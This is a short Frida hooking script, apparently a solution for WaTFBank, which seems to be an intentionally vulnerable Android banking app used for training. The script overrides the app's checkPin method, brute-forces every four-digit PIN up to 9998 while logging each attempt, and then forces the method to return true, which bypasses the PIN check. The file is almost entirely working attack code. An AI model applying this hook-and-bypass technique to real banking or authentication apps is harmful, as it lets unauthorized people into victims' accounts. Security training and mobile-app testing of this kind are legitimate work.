Java.perform(function () { 
	var c = Java.use('com.WaTF.WaTFBank.CheckPin');
		c.checkPin.implementation = function () {
			console.log('Hook!!');
      	  		for(var i=0; i<9999; i++)
        		{
            			this.checkPin(i+""); 
            			console.log("enter : "  + i); 
        		}
        	return true;
    	}; 
}); 